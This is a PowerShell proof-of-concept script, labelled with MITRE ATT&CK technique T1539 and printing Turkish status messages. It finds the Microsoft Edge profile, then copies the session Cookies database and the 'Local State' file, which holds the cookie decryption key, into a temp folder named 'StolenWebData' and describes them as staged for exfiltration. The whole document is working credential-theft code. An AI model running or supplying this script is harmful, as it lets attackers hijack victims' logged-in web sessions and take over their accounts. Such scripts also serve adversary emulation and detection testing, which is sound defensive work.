#T1539 - Web Session Cookie Collection PoC (Windows/Edge)

Write-Host "Tarayici oturum verileri bulunuyor..." -ForegroundColor Yellow

$EdgeProfile = "$env:LOCALAPPDATA\Microsoft\Edge\User Data"
$StagingDir  = "$env:TEMP\StolenWebData"

if (-not (Test-Path $StagingDir)) { New-Item -ItemType Directory -Force -Path $StagingDir | Out-Null }

$CookiesPath1 = "$EdgeProfile\Default\Network\Cookies"
$CookiesPath2 = "$EdgeProfile\Default\Cookies"
$LocalState   = "$EdgeProfile\Local State"

$TargetCookies = if (Test-Path $CookiesPath1) { $CookiesPath1 } elseif (Test-Path $CookiesPath2) { $CookiesPath2 } else { $null }

if ($TargetCookies -and (Test-Path $LocalState)) {
    Write-Host "Profil bulundu. Veriler exfiltration icin kopyalaniyor..." -ForegroundColor Green
    Copy-Item -Path $TargetCookies -Destination "$StagingDir\Cookies" -Force
    Copy-Item -Path $LocalState -Destination "$StagingDir\Local_State" -Force
    Write-Host "Islem tamam. Calinan dosyalar $StagingDir dizinine alindi." -ForegroundColor Green
} else {
    Write-Host "Tarayici veritabanlari bulunamadi." -ForegroundColor Red
}
